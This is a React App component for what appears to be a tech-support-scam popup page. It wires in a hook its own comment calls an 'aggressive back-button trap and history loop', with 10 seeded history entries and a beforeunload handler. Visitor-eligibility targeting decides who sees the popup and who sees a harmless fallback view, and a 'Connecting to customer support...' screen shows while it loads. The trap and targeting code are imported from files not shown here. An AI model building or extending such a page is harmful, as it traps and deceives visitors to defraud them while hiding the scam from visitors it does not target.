import { useEligibility } from './hooks/useEligibility.js';
import { useBackTrap } from './hooks/useBackTrap.js';
import { PopupCard } from './components/PopupCard.jsx';
import { FallbackView } from './components/FallbackView.jsx';
import { DevInspector } from './components/DevInspector.jsx';
import './App.css';

function App() {
  const {
    isEligible,
    isLoading,
    details: eligibilityDetails,
    setDevOverride,
    refresh,
  } = useEligibility();

  // Aggressive back-button trap and history loop (seeded on first interaction)
  useBackTrap({
    seedCount: 10,
    enableBeforeUnload: true,
  });

  return (
    <div className="page-wrapper">
      {isLoading ? (
        <div className="popup-container" role="status" aria-live="polite">
          <div className="popup-content">
            <div className="popup-body">
              <h1 className="popup-heading">Loading...</h1>
              <p className="popup-paragraph">Connecting to customer support...</p>
            </div>
          </div>
        </div>
      ) : isEligible ? (
        <PopupCard />
      ) : (
        <FallbackView />
      )}

      {/* Developer targeting inspector - only active in dev mode, never in production */}
      {import.meta.env.DEV && (
        <DevInspector
          eligibilityDetails={eligibilityDetails}
          setDevOverride={setDevOverride}
          refresh={refresh}
          isEligible={isEligible}
        />
      )}
    </div>
  );
}

export default App;
